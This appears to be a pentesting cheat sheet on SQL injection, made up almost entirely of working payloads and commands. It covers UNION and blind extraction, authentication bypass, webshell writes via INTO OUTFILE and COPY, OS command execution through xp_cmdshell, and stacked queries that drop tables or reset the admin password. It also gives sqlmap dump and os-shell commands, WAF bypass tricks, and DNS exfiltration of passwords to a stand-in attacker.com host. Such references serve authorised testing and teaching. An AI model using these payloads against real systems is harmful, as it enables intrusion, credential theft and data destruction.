+++
title = "SQL Injection"
date = "2026-03-06T00:00:00-05:00"
tags = ["sql", "web", "injection"]
description = "SQL injection techniques, payloads, sqlmap usage, and WAF bypass methods."
draft = false
+++


## Detection

```
'
''
`
')
"))
' OR '1'='1
' OR 1=1--
" OR 1=1--
admin'--
' WAITFOR DELAY '0:0:5'--   (MSSQL time-based)
' AND SLEEP(5)--             (MySQL time-based)
```

---

## Comment Syntax by DB

| DB         | Comments                  |
|------------|---------------------------|
| MySQL      | `-- -`, `#`, `/* */`      |
| PostgreSQL | `--`, `/* */`             |
| MSSQL      | `--`, `/* */`             |
| Oracle     | `--`, `/* */`             |
| SQLite     | `--`, `/* */`             |

---

## UNION-Based Injection

### 1. Find column count
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   -- error = too many columns, go back one
```

Or:
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

### 2. Find string columns
```sql
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
```

### 3. Extract data
```sql
' UNION SELECT username,password,NULL FROM users--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
```

---

## Blind Boolean-Based

```sql
' AND 1=1--   (true)
' AND 1=2--   (false — different response = injectable)

' AND SUBSTRING(username,1,1)='a'--
' AND (SELECT COUNT(*) FROM users)>0--
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
```

---

## Blind Time-Based

```sql
-- MySQL
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND IF(SUBSTRING(password,1,1)='a',SLEEP(5),0)--

-- PostgreSQL
'; SELECT pg_sleep(5)--
' AND 1=(SELECT 1 FROM pg_sleep(5))--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--
' AND 1=(SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END)--

-- Oracle
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
' AND 1=(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '1' END FROM dual)--
```

---

## Database Fingerprinting

```sql
-- MySQL
SELECT @@version
SELECT @@datadir

-- PostgreSQL
SELECT version()
SELECT current_database()
SELECT current_user

-- MSSQL
SELECT @@version
SELECT DB_NAME()
SELECT SYSTEM_USER

-- Oracle
SELECT * FROM v$version
SELECT ora_database_name FROM dual
SELECT user FROM dual

-- SQLite
SELECT sqlite_version()
```

---

## Schema Enumeration

### MySQL / PostgreSQL / MSSQL
```sql
-- list databases
SELECT schema_name FROM information_schema.schemata

-- list tables
SELECT table_name FROM information_schema.tables WHERE table_schema=database()

-- list columns
SELECT column_name FROM information_schema.columns WHERE table_name='users'
```

### Oracle
```sql
SELECT owner,table_name FROM all_tables
SELECT column_name FROM all_tab_columns WHERE table_name='USERS'
```

### SQLite
```sql
SELECT name FROM sqlite_master WHERE type='table'
SELECT sql FROM sqlite_master WHERE name='users'
```

---

## File Read / Write

### MySQL
```sql
-- read file (requires FILE privilege)
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--

-- write webshell
' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--
```

### PostgreSQL
```sql
-- read file
COPY users FROM '/etc/passwd'

-- write file
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php'

-- OS command execution (superuser only)
COPY cmd_exec FROM PROGRAM 'id'
```

### MSSQL
```sql
-- xp_cmdshell (if enabled)
'; EXEC xp_cmdshell('whoami')--

-- enable xp_cmdshell
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--
```

---

## Authentication Bypass

```sql
admin'--
admin'/*
' OR 1=1--
' OR 'x'='x
') OR ('1'='1
' OR 1=1#
admin' OR '1'='1
' OR ''='
```

---

## Second-Order SQLi

Data stored safely but executed unsafely later. Register with username `admin'--`, then when the app does:
```sql
SELECT * FROM users WHERE username='admin'--'
```
the `--` comments out the rest.

---

## Stacked Queries

Supported by: PostgreSQL, MSSQL, SQLite. **Not** MySQL via most PHP connectors.

```sql
'; INSERT INTO users VALUES('hacker','hacker')--
'; DROP TABLE users--
'; UPDATE users SET password='hacked' WHERE username='admin'--
```

---

## sqlmap Quick Reference

```bash
# basic scan
sqlmap -u "http://target/page?id=1" --batch

# with cookie (authenticated)
sqlmap -u "http://target/page?id=1" --cookie="PHPSESSID=abc123" --batch

# POST request
sqlmap -u "http://target/login" --data="user=admin&pass=test" --batch

# specify injection param
sqlmap -u "http://target/?id=1&cat=2" -p id --batch

# enumerate databases
sqlmap -u "http://target/?id=1" --dbs --batch

# enumerate tables
sqlmap -u "http://target/?id=1" -D dbname --tables --batch

# dump table
sqlmap -u "http://target/?id=1" -D dbname -T users --dump --batch

# OS shell (PostgreSQL / MSSQL)
sqlmap -u "http://target/?id=1" --os-shell --batch

# force technique
sqlmap -u "http://target/?id=1" --technique=T --batch   # T=time, B=boolean, U=union, S=stacked

# tamper scripts (WAF bypass)
sqlmap -u "http://target/?id=1" --tamper=space2comment,between --batch

# flush session cache
sqlmap -u "http://target/?id=1" --os-shell --flush-session --batch
```

---

## WAF Bypass Techniques

```sql
-- case variation
SeLeCt UsErNaMe FrOm UsErS

-- comment insertion
SE/**/LECT user/**/name FROM users
UN/**/ION SEL/**/ECT NULL--

-- URL encoding
%27 = '
%20 = space
%23 = #

-- double URL encoding
%2527 = %27 = '

-- whitespace alternatives
SELECT%09username%09FROM%09users
SELECT%0ausername%0afrom%0ausers

-- inline comment as space
SELECT(username)FROM(users)

-- scientific notation (MySQL)
1e0 UNION SELECT ...
```

---

## Out-of-Band (OOB) Exfiltration

```sql
-- MySQL (DNS)
' AND LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\a'))--

-- MSSQL (DNS via xp_dirtree)
'; EXEC master..xp_dirtree '\\attacker.com\a'--

-- PostgreSQL (DNS)
'; COPY (SELECT password FROM users LIMIT 1) TO PROGRAM 'nslookup attacker.com'--
```

---

## NoSQL Injection (MongoDB)

```
# URL parameter
?user[$ne]=invalid

# JSON body
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": "admin", "password": {"$regex": "^a"}}

# operator injection
$eq, $ne, $gt, $lt, $in, $nin, $regex, $where
```

---

## Tools

| Tool        | Use                                      |
|-------------|------------------------------------------|
| sqlmap      | Automated SQLi detection and exploitation|
| Burp Suite  | Intercept / manual testing               |
| ghauri      | sqlmap alternative, faster in some cases |
| NoSQLMap    | NoSQL injection automation               |
| havij       | (legacy) GUI SQLi tool                   |
